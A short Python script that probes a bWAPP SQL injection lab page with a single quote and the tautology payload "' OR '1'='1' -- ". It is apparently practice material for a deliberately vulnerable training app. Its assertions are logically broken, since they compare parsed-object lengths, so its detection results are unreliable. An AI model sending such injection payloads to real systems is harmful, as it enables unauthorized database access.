import requests
from bs4 import BeautifulSoup

url = "https://bwapp.hakhub.net/sqli_1.php"

response_empty_search = requests.get(url, params={'search': ''})
soup_empty_search = BeautifulSoup(response_empty_search.text, 'html.parser')

response_quote = requests.get(url, params={'search': "'"})
soup_quote = BeautifulSoup(response_quote.text, 'html.parser')

assert len(soup_empty_search) != len(soup_quote), "Potential SQL Injection vulnerability detected"

payload = "' OR '1'='1' -- "
response_exploit = requests.get(url, params={'search': payload})
soup_exploit = BeautifulSoup(response_exploit.text, 'html.parser')
assert payload in soup_exploit, "Payload not found in response"